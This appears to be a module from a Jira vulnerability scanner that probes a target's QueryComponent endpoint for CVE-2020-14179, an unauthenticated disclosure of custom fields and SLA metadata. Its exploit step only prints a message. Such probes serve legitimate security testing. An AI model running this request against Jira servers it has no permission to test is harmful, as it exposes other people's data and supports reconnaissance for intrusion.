#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.style import Style
from jiraffe.enums import Severity


class CVE202014179(Exploit):
    cve = "CVE-2020-14179"
    severity = Severity.LOW
    description = "Unauthenticated QueryComponent disclosure of custom fields and SLA metadata"

    def check(self) -> bool:
        r = self.client.get(f"{self.target}/secure/QueryComponent!Default.jspa")
        # page existence + expected content
        return r.status_code == 200 and ("querycomponent" in r.text.lower() or "searchers" in r.text.lower())

    def exploit(self) -> None:
        print(Style.CYAN("[*] QueryComponent endpoint reachable, possible field metadata disclosure"))
